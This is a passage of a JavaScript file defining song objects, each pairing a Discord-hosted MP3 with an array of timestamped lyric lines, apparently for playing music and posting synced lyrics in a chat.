                                    "There's a flashing in my eyes",
                                    55715
                                ],
                                [
                                    "Don't you see my condition",
                                    58299
                                ],
                                [
                                    "The fiction",
                                    61009
                                ],
                                [
                                    "is gonna run it again",
                                    62601
                                ],
                                [
                                    "Can't you see now illusions",
                                    64399
                                ],
                                [
                                    "Right into your mind",
                                    67186
                                ],
                                [
                                    "Deja vu",
                                    71102
                                ],
                                [
                                    "I've just been",
                                    72205
                                ],
                                [
                                    "in this place before",
                                    72846
                                ],
                                [
                                    "Higher on the street",
                                    74070
                                ],
                                [
                                    "And I know it's my time to go",
                                    75226
                                ],
                                [
                                    "Calling you and",
                                    77414
                                ],
                                [
                                    "the search is a mystery",
                                    78540
                                ],
                                [
                                    "Standing on my feet",
                                    80256
                                ],
                                [
                                    "It's so hard when",
                                    81402
                                ],
                                [
                                    "I try to be me",
                                    82361
                                ],
                                [
                                    "UOOOHH",
                                    83974
                                ],
                                [
                                    "Deja vu",
                                    85496
                                ],
                                [
                                    "I've just been in",
                                    86224
                                ],
                                [
                                    "this time before",
                                    86992
                                ],
                                [
                                    "Higher on the street",
                                    88087
                                ],
                                [
                                    "And I know it's a place to go",
                                    89232
                                ],
                                [
                                    "Calling you and",
                                    91432
                                ],
                                [
                                    "the search is a mystery",
                                    92534
                                ],
                                [
                                    "Standing on my feet",
                                    94184
                                ],
                                [
                                    "It's so hard when",
                                    95454
                                ],
                                [
                                    "I try to be me",
                                    96331
                                ],
                                [
                                    "YEAHHH",
                                    97862
                                ],
                                [
                                    "See the future",
                                    111909
                                ],
                                [
                                    "into the present",
                                    113614
                                ],
                                [
                                    "See my past lives",
                                    115335
                                ],
                                [
                                    "in the distance",
                                    116885
                                ],
                                [
                                    "Try to guess now",
                                    118423
                                ],
                                [
                                    "what's going on",
                                    120073
                                ],
                                [
                                    "And the band begins to play",
                                    121129
                                ],
                                [
                                    "Don't you see my condition",
                                    123653
                                ],
                                [
                                    "The fiction",
                                    126436
                                ],
                                [
                                    "is gonna run it again",
                                    128002
                                ],
                                [
                                    "Can't you see now illusions",
                                    129709
                                ],
                                [
                                    "Right into your mind",
                                    132703
                                ],
                                [
                                    "Deja vu",
                                    136269
                                ],
                                [
                                    "I've just been",
                                    137353
                                ],
                                [
                                    "in this place before",
                                    138199
                                ],
                                [
                                    "Higher on the street",
                                    139454
                                ],
                                [
                                    "And I know",
                                    140683
                                ],
                                [
                                    "it's my time to go",
                                    141457
                                ],
                                [
                                    "Calling you",
                                    142833
                                ],
                                [
                                    "and the search is a mystery",
                                    143741
                                ],
                                [
                                    "Standing on my feet",
                                    145424
                                ],
                                [
                                    "It's so hard when",
                                    146779
                                ],
                                [
                                    "I try to be me",
                                    147596
                                ],
                                [
                                    "UOOOHH",
                                    149231
                                ],
                                [
                                    "Deja vu",
                                    150890
                                ],
                                [
                                    "I've just been in",
                                    151580
                                ],
                                [
                                    "this time before",
                                    152301
                                ],
                                [
                                    "Higher on the beat",
                                    153484
                                ],
                                [
                                    "And I know it's",
                                    154656
                                ],
                                [
                                    "a place to go",
                                    155631
                                ],
                                [
                                    "Calling you",
                                    156815
                                ],
                                [
                                    "and the search is a mystery",
                                    158038
                                ],
                                [
                                    "Standing on my feet",
                                    159645
                                ],
                                [
                                    "It's so hard when",
                                    160557
                                ],
                                [
                                    "I try to be me",
                                    161571
                                ],
                                [
                                    "YEAHHH",
                                    163347
                                ]
                            ]
                        };
                        this.norival = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/784941059066167316/977724487283912735/Nightcore_-_No_Rival_-_Lyrics.mp3"),
                            chats: [
                                [
                                    "Here and now",
                                    11198
                                ],
                                [
                                    "you're coming up to me",
                                    12140
                                ],
                                [
                                    "'Fore I'm lighting up the sky",
                                    13500
                                ],
                                [
                                    "Feel the ground",
                                    16583
                                ],
                                [
                                    "shaking underneath",
                                    17638
                                ],
                                [
                                    "Trying to take me alive",
                                    18855
                                ],
                                [
                                    "Oh-oh-ohhh",
                                    21720
                                ],
                                [
                                    "Get ready for the fallout",
                                    24012
                                ],
                                [
                                    "Oh-oh-ohhh",
                                    26981
                                ],
                                [
                                    "Can't stop me now",
                                    29312
                                ],
                                [
                                    "I got no rival",
                                    31419
                                ],
                                [
                                    "I'ma find my way",
                                    33196
                                ],
                                [
                                    "Through the blood and pain",
                                    35172
                                ],
                                [
                                    "Game of survival",
                                    36491
                                ],
                                [
                                    "Any time or place",
                                    38528
                                ],
                                [
                                    "Watch 'em run away",
                                    40492
                                ],
                                [
                                    "I got no",
                                    41945
                                ],
                                [
                                    "I'll be standing on my own",
                                    43651
                                ],
                                [
                                    "Never gonna take my thrown",
                                    45499
                                ],
                                [
                                    "I got no rival",
                                    47335
                                ],
                                [
                                    "Watch 'em run away",
                                    49108
                                ],
                                [
                                    "I got no, no, no",
                                    50943
                                ],
                                [
                                    "I got no, no, no rival",
                                    52146
                                ],
                                [
                                    "No rival",
                                    63910
                                ],
                                [
                                    "No rival",
                                    69272
                                ],
                                [
                                    "Tell them now what you gon' do",
                                    75032
                                ],
                                [
                                    "We can do this face to face",
                                    77157
                                ],
                                [
                                    "Reckoning is coming in soon",
                                    80284
                                ],
                                [
                                    "Doesn't matter what you say",
                                    82523
                                ],
                                [
                                    "Trying to tell you",
                                    85098
                                ],
                                [
                                    "listen to the moment",
                                    86269
                                ],
                                [
                                    "Can't take mine",
                                    87544
                                ],
                                [
                                    "'cause I own it",
                                    88213
                                ],
                                [
                                    "Don't you know that",
                                    90057
                                ],
                                [
                                    "I'm locked and I'm loaded",
                                    91775
                                ],
                                [
                                    "You're out of focus",
                                    93433
                                ],
                                [
                                    "Oh-oh-ohhh",
                                    96303
                                ],
                                [
                                    "Get ready for the fallout",
                                    98299
                                ],
                                [
                                    "Oh-oh-ohhh",
                                    101475
                                ],
                                [
                                    "Can't stop me now",
                                    103533
                                ],
                                [
                                    "I got no rival",
                                    105353
                                ],
                                [
                                    "I'ma find my way",
                                    107419
                                ],
                                [
                                    "Through the blood and pain",
                                    109215
                                ],
                                [
                                    "Game of survival",
                                    110747
                                ],
                                [
                                    "Any time or place",
                                    112730
                                ],
                                [
                                    "Watch 'em run away",
                                    114664
                                ],
                                [
                                    "I got no",
                                    116031
                                ],
                                [
                                    "I'll be standing on my own",
                                    117862
                                ],
                                [
                                    "Never gonna take my thrown",
                                    119722
                                ],
                                [
                                    "I got no rival",
                                    121376
                                ],
                                [
                                    "Watch 'em run away",
                                    123338
                                ],
                                [
                                    "I got no, no, no",
                                    125165
                                ],
                                [
                                    "I got no, no, no rival",
                                    126388
                                ],
                                [
                                    "No rival",
                                    132506
                                ],
                                [
                                    "I got no, no, no",
                                    136063
                                ],
                                [
                                    "I got no, no, no rival",
                                    137058
                                ],
                                [
                                    "No rival",
                                    143220
                                ],
                                [
                                    "No rival",
                                    159585
                                ]
                            ]
                        };
                        this.inv = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/975954604451831828/980059990356279316/Crypt_x_Joey_Nato_-_Invincible_feat._soslesion_OFFICIAL_MUSIC_VIDEO.mp3"),
                            chats: [
                                [
                                    "Yeah, yeah, yeah",
                                    3890
                                ],
                                [
                                    "Get myself into the game",
                                    11624
                                ],
                                [
                                    "I'ma run it up anyway",
                                    13854
                                ],
                                [
                                    "I get with the violence",
                                    17898
                                ],
                                [
                                    "I don't think you wanna try it",
                                    19893
                                ],
                                [
                                    "I'm so up",
                                    22911
                                ],
                                [
                                    "I feel invincible",
                                    23678
                                ],
                                [
                                    "I don't know",
                                    26102
                                ],
                                [
                                    "if they get it though",
                                    26784
                                ],
                                [
                                    "I'm so up",
                                    28401
                                ],
                                [
                                    "I feel invincible",
                                    29073
                                ],
                                [
                                    "Fuck what you said",
                                    31587
                                ],
                                [
                                    "I'm invincible",
                                    32639
                                ],
                                [
                                    "Lookin' for a break",
                                    34483
                                ],
                                [
                                    "and now I think",
                                    35417
                                ],
                                [
                                    "I finally caught one",
                                    36239
                                ],
                                [
                                    "We're talkin'",
                                    37281
                                ],
                                [
                                    "legendary status",
                                    38092
                                ],
                                [
                                    "when it's all done",
                                    39193
                                ],
                                [
                                    "I'm a star bitch",
                                    40259
                                ],
                                [
                                    "if you ever saw one",
                                    41257
                                ],
                                [
                                    "Law and Order over here",
                                    43408
                                ],
                                [
                                    "and it's a Tommy one",
                                    44760
                                ],
                                [
                                    "Meet me at the top",
                                    45828
                                ],
                                [
                                    "it's goin' down",
                                    47841
                                ],
                                [
                                    "They tryna fit in my circle",
                                    48355
                                ],
                                [
                                    "I'm not around (Nah)",
                                    49618
                                ],
                                [
                                    "I was down before",
                                    50887
                                ],
                                [
                                    "but not for the count",
                                    52516
                                ],
                                [
                                    "Shit was real heavy",
                                    53741
                                ],
                                [
                                    "now it's dollars",
                                    55010
                                ],
                                [
                                    "not the pound",
                                    55590
                                ],
                                [
                                    "Tell me what you smokin'",
                                    56879
                                ],
                                [
                                    "if you think that I'm a joke",
                                    57801
                                ],
                                [
                                    "Only time I'm trippin'",
                                    59455
                                ],
                                [
                                    "is when I'm out on a road",
                                    60356
                                ],
                                [
                                    "Only droppin' joints",
                                    62286
                                ],
                                [
                                    "if that is fuckin' dope",
                                    63270
                                ],
                                [
                                    "Scary when you see me",
                                    65141
                                ],
                                [
                                    "got them meming me like nope",
                                    66211
                                ],
                                [
                                    "(Nope, nope, nope, nope)",
                                    67656
                                ],
                                [
                                    "Hate to say it, but",
                                    68886
                                ],
                                [
                                    "you're runnin' out of time",
                                    70326
                                ],
                                [
                                    "I don't know 'bout you, but",
                                    72052
                                ],
                                [
                                    "I'ma make the most of mine",
                                    72845
                                ],
                                [
                                    "Lookin' clean until",
                                    74738
                                ],
                                [
                                    "a youngin' in the dirt",
                                    75742
                                ],
                                [
                                    "Value through the roof",
                                    77076
                                ],
                                [
                                    "yeah, yeah",
                                    78516
                                ],
                                [
                                    "I know my worth, Nato",
                                    79436
                                ],
                                [
                                    "Get myself into the game",
                                    80575
                                ],
                                [
                                    "I'ma run it up anyway",
                                    82594
                                ],
                                [
                                    "I get with the violence",
                                    85923
                                ],
                                [
                                    "I don't think you wanna try it",
                                    88419
                                ],
                                [
                                    "I'm so up",
                                    91257
                                ],
                                [
                                    "I feel invincible",
                                    91995
                                ],
                                [
                                    "I don't know if they get it though",
                                    94660
                                ],
                                [
                                    "I'm so up",
                                    96966
                                ],
                                [
                                    "I feel invincible",
                                    97642
                                ],
                                [
                                    "Fuck what you said",
                                    99967
                                ],
                                [
                                    "I'm invincible",
                                    101046
                                ],
                                [
                                    "If you wanna try",
                                    103308
                                ],
                                [
                                    "to bring me down",
                                    103971
                                ],
                                [
                                    "you gotta reach me",
                                    104685
                                ],
                                [
                                    "I'm high up in the clouds",
                                    105864
                                ],
                                [
                                    "while your're just",
                                    107039
                                ],
                                [
                                    "down in the seaweeds",
                                    107608
                                ],
                                [
                                    "I see these little rappers",
                                    108622
                                ],
                                [
                                    "they all wanna be me",
                                    109897
                                ],
                                [
                                    "But nobody wanna put the work in",
                                    110826
                                ],
                                [
                                    "'Cause they thinkin'",
                                    112134
                                ],
                                [
                                    "that I got it easy",
                                    112752
                                ],
                                [
                                    "but that's sleezy",
                                    113502
                                ],
                                [
                                    "My path to the top was hard",
                                    114485
                                ],
                                [
                                    "but nothin' out there",
                                    115575
                                ],
                                [
                                    "could me make stop",
                                    116247
                                ],
                                [
                                    "Every time I thought",
                                    116981
                                ],
                                [
                                    "it went one way",
                                    117624
                                ],
                                [
                                    "it turned out that it did not",
                                    118407
                                ],
                                [
                                    "I got so many",
                                    119291
                                ],
                                [
                                    "obstacles for my opps",
                                    120297
                                ],
                                [
                                    "so many prayin'",
                                    121206
                                ],
                                [
                                    "that I would drop",
                                    122096
                                ],
                                [
                                    "I had to go around",
                                    122774
                                ],
                                [
                                    "the whole world",
                                    123521
                                ],
                                [
                                    "just to get to",
                                    124260
                                ],
                                [
                                    "the end of my block",
                                    124866
                                ],
                                [
                                    "I built my skin so tough",
                                    125523
                                ],
                                [
                                    "achievin' all my desires",
                                    126727
                                ],
                                [
                                    "I could walk through",
                                    128065
                                ],
                                [
                                    "Hell without gettin'",
                                    129449
                                ],
                                [
                                    "burned by the fire",
                                    130009
                                ],
                                [
                                    "Oh, I admire those",
                                    130697
                                ],
                                [
                                    "that are deniers",
                                    132867
                                ],
                                [
                                    "'Cause you messed around",
                                    134285
                                ],
                                [
                                    "turned me to a",
                                    135069
                                ],
                                [
                                    "cold blooded fighter",
                                    135885
                                ],
                                [
                                    "Im so up I feel invincible",
                                    137218
                                ],
                                [
                                    "I hope my words",
                                    140013
                                ],
                                [
                                    "feel like insults",
                                    141190
                                ],
                                [
                                    "I'm up right now",
                                    142979
                                ],
                                [
                                    "you stuck right now",
                                    144030
                                ],
                                [
                                    "Stay down there",
                                    145496
                                ],
                                [
                                    "on that ground",
                                    146574
                                ],
                                [
                                    "Get myself into the game",
                                    147924
                                ],
                                [
                                    "I'ma run it up anyway",
                                    151037
                                ],
                                [
                                    "I get with the violence",
                                    154527
                                ],
                                [
                                    "I don't think you wanna try it",
                                    156787
                                ],
                                [
                                    "I'm so up",
                                    160415
                                ],
                                [
                                    "I feel invincible",
                                    160990
                                ],
                                [
                                    "I don't know",
                                    163133
                                ],
                                [
                                    "if they get it though",
                                    163952
                                ],
                                [
                                    "I'm so up",
                                    165446
                                ],
                                [
                                    "I feel invincible",
                                    166148
                                ],
                                [
                                    "Fuck what you said",
                                    168516
                                ],
                                [
                                    "I'm invincible",
                                    169519
                                ],
                                [
                                    "Talk like I'm at the top now",
                                    171475
                                ],
                                [
                                    "If you hit me, I can't fall down",
                                    173836
                                ],
                                [
                                    "Run up, I'm not second place and",
                                    177162
                                ],
                                [
                                    "I tell 'em that in runnin'",
                                    178025
                                ],
                                [
                                    "all my bases",
                                    181206
                                ],
                                [
                                    "I'm so up",
                                    182808
                                ],
                                [
                                    "I feel invincible",
                                    183340
                                ],
                                [
                                    "I don't know if",
                                    186082
                                ],
                                [
                                    "they get it though",
                                    186813
                                ],
                                [
                                    "I'm so up",
                                    188342
                                ],
                                [
                                    "I feel invincible",
                                    189013
                                ],
                                [
                                    "Fuck what you said",
                                    192064
                                ],
                                [
                                    "I'm invincible",
                                    192606
                                ]
                            ]
                        };
                        this.giants = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/617560371913293827/1023807988047294464/V_O_E_-_Giants_Lyrics.mp3"), chats: [["Oh, where am I going now", 10213], ["just falling over dreams?", 11952], ["Now I'm just so far gone", 15815], ["this isn't what it seems..", 17563], ["It's taking me so damn long", 21274], ["it's fading from believe", 23182], ["I need to slow this down", 26880], ["it's burning from beneath", 28361], ["Come break this light", 32622], ["Before tomorrow dies", 35938], ["Holding on for what", 38578], ["is worth my life", 40752], ["I know in time", 43714], ["I'll make it up the vine", 46797], ["Find my way to giants", 49458], ["in the sky", 51305], ["Tonight it comes to life", 53609], ["Tonight it comes to life", 75604], ["Where am I going now,", 98364], ["just falling over dreams?", 101623], ["Now I'm just so far gone,", 104059], ["this isn't what it seems", 106393], ["It's taking me so damn long,", 109598], ["it's fading from believe", 110995], ["I need to slow this down", 115074], ["it's burning from beneath", 117293], ["Come break this light",121103],["Before tomorrow dies", 124000],["Holding on for what",126824],["is worth my lifе",128132],["I know in time",132000],["I'll make it up the vinе",135098],["Find my way to",137797],["giants in the sky",139231],["Tonight it comes to life",141870],["Tonight it comes to life",152722],["Come break this light",176157],["Before tomorrow dies",179155],["Holding on to what is",181855],["worth my life",183000],["I know in time",187145],["I'll make it up the vine",190330],["Find my way to",193014],["giants in the sky",195132],["Tonight it comes to life",197183]]
                        };
                        this.glorydays = {
                            audio: new Audio ("https://cdn.discordapp.com/attachments/990241234696167428/1023774910067261590/FELLOWSHIP_-_Glory_Days_Official_Lyric_Video_192_kbps.mp3"),
                            chats: [
                                [
                                    "As the light within me falls",
                                    47320
                                ],
                                [
                                    "another day departs",
                                    49338
                                ],
                                [
                                    "if only I could see",
                                    52172
                                ],
                                [
                                    "the dawn beyond",
                                    54166
                                ],
                                [
                                    "the shadows cast",
                                    55214
                                ],
                                [
                                    "An empire of doubt",
                                    57561
                                ],
                                [
                                    "a heart full of clouds",
                                    58671
                                ],
                                [
                                    "befall the souls within her",
                                    60113
                                ],
                                [
                                    "the valley will weep",
                                    62134
                                ],
                                [
                                    "as a mirror of old",
                                    63920
                                ],
                                [
                                    "as hope is halfway damned",
                                    65463
                                ],
                                [
                                    "Oh, to see our last day",
                                    68481
                                ],
                                [
                                    "with all these",
                                    70021
                                ],
                                [
                                    "shattered voices raised",
                                    71037
                                ],
                                [
                                    "Oh say, will you fight?",
                                    72920
                                ],
                                [
                                    "To seek the glory days,",
                                    77842
                                ],
                                [
                                    "We'll fight the lion's way",
                                    80642
                                ],
                                [
                                    "Then let the rain",
                                    83334
                                ],
                                [
                                    "wash all of our pride away",
                                    85272
                                ],
                                [
                                    "So if this victory",
                                    88786
                                ],
                                [
                                    "is our last odyssey,",
                                    91400
                                ],
                                [
                                    "Then let the power",
                                    94134
                                ],
                                [
                                    "within us decide!",
                                    96046
                                ],
                                [
                                    "On the backs of giants",
                                    117344
                                ],
                                [
                                    "long deceased",
                                    119252
                                ],
                                [
                                    "are we still standing",
                                    120096
                                ],
                                [
                                    "we measure our worth",
                                    122557
                                ],
                                [
                                    "by all the days",
                                    123929
                                ],
                                [
                                    "we wasted then.",
                                    125403
                                ],
                                [
                                    "All of our time",
                                    127753
                                ],
                                [
                                    "and all of our might",
                                    128916
                                ],
                                [
                                    "are fueled by",
                                    130086
                                ],
                                [
                                    "the heartache of winter.",
                                    131045
                                ],
                                [
                                    "Oh life as we know",
                                    132595
                                ],
                                [
                                    "it is bitter and cold",
                                    133924
                                ],
                                [
                                    "but souls burn",
                                    135278
                                ],
                                [
                                    "best with spite.",
                                    136334
                                ],
                                [
                                    "Oh, to see our last day",
                                    138568
                                ],
                                [
                                    "with all these",
                                    140287
                                ],
                                [
                                    "shattered voices raised",
                                    141002
                                ],
                                [
                                    "Oh say, will you fight?",
                                    142849
                                ],
                                [
                                    "To seek the glory days,",
                                    147919
                                ],
                                [
                                    "We'll fight the lion's way",
                                    150668
                                ],
                                [
                                    "Then let the rain",
                                    153331
                                ],
                                [
                                    "wash all of our pride away",
                                    155055
                                ],
                                [
                                    "So if this victory",
                                    158747
                                ],
                                [
                                    "is our last odyssey,",
                                    161502
                                ],
                                [
                                    "Then let the power",
                                    164244
                                ],
                                [
                                    "within us decide!",
                                    166385
                                ],
                                [
                                    "If we have to choose our fate,",
                                    170992
                                ],
                                [
                                    "It's still our choice to make",
                                    175794
                                ],
                                [
                                    "Oh, to see our last day",
                                    235540
                                ],
                                [
                                    "with all these",
                                    237420
                                ],
                                [
                                    "shattered voices raised",
                                    238154
                                ],
                                [
                                    "Oh say, will you fight?",
                                    239979
                                ],
                                [
                                    "To seek the glory days,",
                                    244971
                                ],
                                [
                                    "We'll fight the lion's way",
                                    247863
                                ],
                                [
                                    "Then let the rain",
                                    250476
                                ],
                                [
                                    "wash all of our pride away",
                                    252209
                                ],
                                [
                                    "To seek the glory days,",
                                    255934
                                ],
                                [
                                    "We'll fight the lion's way",
                                    258458
                                ],
                                [
                                    "Then let the rain",
                                    261368
                                ],
                                [
                                    "wash all of our pride away",
                                    263131
                                ],
                                [
                                    "So if this victory",
                                    266838
                                ],
                                [
                                    "is our last odyssey,",
                                    269354
                                ],
                                [
                                    "Let the power within",
                                    272733
                                ],
                                [
                                    "ignite where we've been",
                                    274332
                                ],
                                [
                                    "let the power within us decide",
                                    277877
                                ]
                            ]
                        }
                        this.ipip = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/1008700151579295824/1023235261066399744/Electro-Light_-_Symbolism_NCS_Release.mp3"),
                            chats: [
                                [
                                    "Turi, ip ip ip",
                                    5416
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    8978
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    12132
                                ],
                                [
                                    "Eugh turi",
                                    13782
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    15109
                                ],
                                [
                                    "Turi, ip ip ip",
                                    17597
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    20042
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    23025
                                ],
                                [
                                    "Eugh turi",
                                    24480
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    26215
                                ],
                                [
                                    "Turi, ip ip ip",
                                    29205
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    31504
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    34192
                                ],
                                [
                                    "Eugh turi",
                                    36291
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    37558
                                ],
                                [
                                    "Turi, ip ip ip",
                                    40202
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    42762
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    45921
                                ],
                                [
                                    "Eugh turi",
                                    47710
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    48742
                                ],
                                [
                                    "Turi, ip ip ip",
                                    56435
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    58173
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    59676
                                ],
                                [
                                    "Eugh turi",
                                    60421
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    60952
                                ],
                                [
                                    "Turi, ip ip ip",
                                    62832
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    65534
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    68072
                                ],
                                [
                                    "Eugh turi",
                                    69931
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    71160
                                ],
                                [
                                    "Turi, ip ip ip",
                                    74119
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    76666
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    79454
                                ],
                                [
                                    "Eugh turi",
                                    81186
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    82433
                                ],
                                [
                                    "Turi, ip ip ip",
                                    85346
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    87963
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    90757
                                ],
                                [
                                    "Eugh turi",
                                    92776
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    93914
                                ],
                                [
                                    "Thsa",
                                    98686
                                ],
                                [
                                    "Ip ip",
                                    100534
                                ],
                                [
                                    "Thsa",
                                    109780
                                ],
                                [
                                    "Ip ip",
                                    116890
                                ],
                                [
                                    "Turi, ip ip ip",
                                    119438
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    121839
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    124701
                                ],
                                [
                                    "Eugh turi",
                                    126186
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    127726
                                ],
                                [
                                    "Turi, ip ip ip",
                                    130610
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    133162
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    136083
                                ],
                                [
                                    "Eugh turi",
                                    138451
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    139431
                                ],
                                [
                                    "Turi, ip ip ip",
                                    141718
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    171766
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    173608
                                ],
                                [
                                    "Eugh turi",
                                    174050
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    174714
                                ],
                                [
                                    "Turi, ip ip ip",
                                    175754
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    178427
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    180996
                                ],
                                [
                                    "Eugh turi",
                                    182437
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    184070
                                ],
                                [
                                    "Turi, ip ip ip",
                                    186868
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    189609
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    192300
                                ],
                                [
                                    "Eugh turi",
                                    193692
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    195611
                                ],
                                [
                                    "Turi, ip ip ip",
                                    198298
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    201268
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    203682
                                ],
                                [
                                    "Eugh turi",
                                    205139
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    206782
                                ],
                                [
                                    "Thsa",
                                    211680
                                ],
                                [
                                    "Ip ip",
                                    219763
                                ],
                                [
                                    "Thsa",
                                    222759
                                ],
                                [
                                    "Ip ip",
                                    229811
                                ],
                                [
                                    "Turi, ip ip ip",
                                    232450
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    234711
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    237682
                                ],
                                [
                                    "Eugh turi",
                                    238925
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    240651
                                ],
                                [
                                    "Turi, ip ip ip",
                                    243450
                                ],
                                [
                                    "Ip ip ip turi ik",
                                    246046
                                ],
                                [
                                    "Ip, tsha ip ik",
                                    248938
                                ],
                                [
                                    "Eugh turi",
                                    250268
                                ],
                                [
                                    "eugh turi isha ip turisha",
                                    251933
                                ]
                            ]

                        }
                        this.livinglife = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/981928418729934898/1_ac_2_6_22.mp3"),
                            chats: [
                                [
                                    "Lord knows and I think",
                                    15780
                                ],
                                [
                                    "I know it too sometimes",
                                    17285
                                ],
                                [
                                    "Every time and",
                                    18961
                                ],
                                [
                                    "they reachin' out for",
                                    20223
                                ],
                                [
                                    "what's mine",
                                    21570
                                ],
                                [
                                    "Lord knows and I think",
                                    22570
                                ],
                                [
                                    "I know it too sometimes",
                                    23781
                                ],
                                [
                                    "Every time and",
                                    25775
                                ],
                                [
                                    "they reachin' out for",
                                    26932
                                ],
                                [
                                    "what's mine",
                                    28198
                                ],
                                [
                                    "I've been awake for days",
                                    28955
                                ],
                                [
                                    "So we out living life",
                                    29943
                                ],
                                [
                                    "in the night",
                                    31597
                                ],
                                [
                                    "Pray to god",
                                    32598
                                ],
                                [
                                    "man I hope I don't die",
                                    33597
                                ],
                                [
                                    "I've been awake for days",
                                    35267
                                ],
                                [
                                    "So we out living life",
                                    36571
                                ],
                                [
                                    "in the night",
                                    38253
                                ],
                                [
                                    "Pray to god",
                                    39199
                                ],
                                [
                                    "man I hope I don't die",
                                    40032
                                ],
                                [
                                    "in the night",
                                    41702
                                ],
                                [
                                    "Lord knows and I think",
                                    42527
                                ],
                                [
                                    "I know it too sometimes",
                                    43935
                                ],
                                [
                                    "Every time and",
                                    45937
                                ],
                                [
                                    "they reachin' out for",
                                    47036
                                ],
                                [
                                    "what's mine",
                                    48436
                                ],
                                [
                                    "Lord knows and I think",
                                    49263
                                ],
                                [
                                    "I know it too sometimes",
                                    50589
                                ],
                                [
                                    "Every time and",
                                    52486
                                ],
                                [
                                    "they reachin' out for",
                                    53708
                                ],
                                [
                                    "what's mine",
                                    55117
                                ],
                                [
                                    "Two bedrooms",
                                    56000
                                ],
                                [
                                    "seven little child",
                                    57218
                                ],
                                [
                                    "can't be right",
                                    58532
                                ],
                                [
                                    "Call my brother",
                                    59452
                                ],
                                [
                                    "he in prison doin' time",
                                    60420
                                ],
                                [
                                    "but we alright",
                                    61855
                                ],
                                [
                                    "Tried my best just to",
                                    62799
                                ],
                                [
                                    "catch a fucking smile",
                                    64059
                                ],
                                [
                                    "But for now",
                                    65327
                                ],
                                [
                                    "I see myself ain't",
                                    66109
                                ],
                                [
                                    "hitting the 35",
                                    67119
                                ],
                                [
                                    "I've been awake for days",
                                    69074
                                ],
                                [
                                    "So we out living life",
                                    70173
                                ],
                                [
                                    "in the night",
                                    71817
                                ],
                                [
                                    "Pray to god",
                                    72875
                                ],
                                [
                                    "man I hope I don't die",
                                    74031
                                ],
                                [
                                    "I've been awake for days",
                                    75399
                                ],
                                [
                                    "So we out living life",
                                    76931
                                ],
                                [
                                    "in the night",
                                    78639
                                ],
                                [
                                    "Pray to god",
                                    79393
                                ],
                                [
                                    "man I hope I don't die",
                                    80235
                                ],
                                [
                                    "in the night",
                                    81927
                                ],
                                [
                                    "Lord knows and I think",
                                    82788
                                ],
                                [
                                    "I know it too sometimes",
                                    84179
                                ],
                                [
                                    "Every time and",
                                    86217
                                ],
                                [
                                    "they reachin' out for",
                                    87354
                                ],
                                [
                                    "what's mine",
                                    88685
                                ],
                                [
                                    "Lord knows and I think",
                                    89588
                                ],
                                [
                                    "I know it too sometimes",
                                    90890
                                ],
                                [
                                    "Every time and",
                                    92840
                                ],
                                [
                                    "they reachin' out",
                                    93997
                                ],
                                [
                                    "for what's mine",
                                    95011
                                ]
                            ]
                        };
                        this.takeover = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/1053111597431795713/1053111637734871100/Take_Over_ft._Jeremy_McKinnon_A_Day_To_Remember_MAX_Henry_Worlds_2020_-_League_of_Legends.mp3"),
                            chats: [
                                [
                                    "We at the top again, now what?",
                                    16900
                                ],
                                [
                                    "Heavy lay the crown, but",
                                    18900
                                ],
                                [
                                    "Count us",
                                    20600
                                ],
                                [
                                    "Higher than the mountain",
                                    21380
                                ],
                                [
                                    "And we be up here",
                                    23300
                                ],
                                [
                                    "for the long run",
                                    24273
                                ],
                                [
                                    "Strap in for a long one",
                                    25413
                                ],
                                [
                                    "We got everybody on one",
                                    27400
                                ],
                                [
                                    "Now you're coming at the king",
                                    29740
                                ],
                                [
                                    "so you better not miss",
                                    30934
                                ],
                                [
                                    "And we only get stronger",
                                    33700
                                ],
                                [
                                    "With everything I",
                                    36163
                                ],
                                [
                                    "carry up on my back",
                                    37292
                                ],
                                [
                                    "you should paint it",
                                    39360
                                ],
                                [
                                    "up with a target",
                                    40771
                                ],
                                [
                                    "Why would you dare me",
                                    46000
                                ],
                                [
